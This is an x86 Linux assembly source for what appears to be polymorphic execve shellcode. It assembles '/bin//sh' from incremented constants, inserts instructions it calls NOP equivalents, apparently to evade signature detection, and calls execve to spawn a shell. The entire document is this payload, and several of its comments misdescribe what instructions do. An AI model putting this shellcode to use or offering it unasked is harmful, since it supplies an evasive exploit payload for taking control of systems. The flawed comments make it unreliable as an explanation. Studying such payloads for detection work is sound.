global _start

_start:

       sahf                      ; Should store instructions. However, it is used as a NOP equivalent.

       xor    eax,eax            ; Zeroes out EAX.
       pushad                    ; Should save the current flags. However, it is used as a NOP equivalent.
       push   eax                ; Pushes the dword of EAX (0x00000000).

       cld                       ; Should clear the direction flag. However, it is used as a NOP equivalent.
       mov esi, 0x68732f2e       ; Saves value "hs/.". If incremented by 1, it should possess value "hs//".
       inc esi                   ; Increments ESI.
       cdq                       ; Zeroes out EDX.
       mov edi, 0x6e69622e       ; Saves value "nib.". If incremented by 1, it should possess value "bin/".
       inc edi                   ; Increments EDI.

       push esi                  ; Pushes the value of ESI ("hs//").
       std                       ; NOP Equivalent.
       push edi                  ; Pushes the value of EDI ("bin/").

       mov ebx, esp              ; Saves the value of ESP in EBX.
       cld                       ; NOP Equivalent.
       cmc                       ; NOP Equivalent.

       mov al, 11                ; Calls execve.
       int 0x80                  ; Calls to kernel.
